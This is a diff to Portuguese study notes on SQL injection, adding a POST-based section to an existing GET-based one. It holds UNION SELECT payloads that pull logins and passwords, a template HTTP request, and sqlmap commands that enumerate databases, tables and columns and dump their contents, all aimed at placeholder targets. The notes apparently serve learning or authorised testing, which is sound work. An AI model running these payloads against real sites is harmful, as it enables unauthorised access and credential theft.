@@ -78,7 +78,7 @@ PRÁTICA
 
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 
-INSERINDO O CÓDIGO
+SQL INJECTION BÁSICO (COM GET)
 
 -> 1) PARA DESCOBRIR O NUMERO DE COLUNAS TOTAL DA TABELA:
     -> union select 1
@@ -114,3 +114,41 @@ INSERINDO O CÓDIGO
         -> union select 1, 2, ..., group_concat(id, ":", login, ":", password )
             -> obs: o ":" é para ficar mais bonito na concatenaçao
     -> lembrando que varias senhas vem em formato de hash e é preciso descriptografá-las
+
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+
+SQL INJECTION COM POST
+
+-> 1) Construir o corpo da requisição
+    -> (header + body, ou seja, tanto as infos de header (cookie, user-agent, etc) quanto o payload do formulario (content-type, infos do forms)
+    ->  POST /route/alvo/index.php?page=blalabla HTTP/1.1
+        Host: site.especifico.com
+        User-Agent: Mozilla blablabla
+        Accept: text/html, blablabla
+        Cookie: blablabla
+        Content-type: blablabla
+        crsf-token=blablablaentry=blablabla&...
+
+-> 2) Dar um SQL Map
+    -> sqlmap -r request-with-full-header-and-body.txt --dbms=o_tipo_de_banco_de_dados --dbs -p blog-entry
+        -> -r (para passar o request header+body)
+        -> --flush-session (limpa todas as infos de sessao armazenadas em cache apos uma execucao anterior do sqlmap)
+        -> --dbms (informar o tipo de banco de dados que deve focar o sqlmap. ex: mysql)
+        -> --dbs (para ele retornar o nome dos bancos de dados (das tabelas))
+        -> -u (poderiamos usar esse parametro seguido da URL do host, mas como ja estamos passando no header, nao precisa)
+        -> -p (caso voce queiram voce tambem passa o lugar que é para testar o post)
+
+-> 3) Depois que voce descobrir o nome da base de dados
+    -> sqlmap -r request-header-body.txt --dbms=banco-de-dados -D nome-do-banco --tables
+    -> vai achar as tabelas
+
+-> 4) agora mira na tabela especifica
+    -> sqlmap -r request-header-body.txt --dbms=data-base -D nome-do-banaco -T nome-da-tabela --columns
+    -> vai achar todas as colunas da base de dados + o datatype de cada dado
+
+-> 5) Agora, absorver os dados daquelas colunas específicas de tal tabela
+    -> sqlmap -r request-header-body.txt --dbms=data-base -D nome-do-banco -T nome-da-tabela -C coluna-x, coluna-y .. --dump
+
+
+OBS:
+    -> sqlmap -u http://site.com/tal/tal --forms --dbms=mysql --dbs
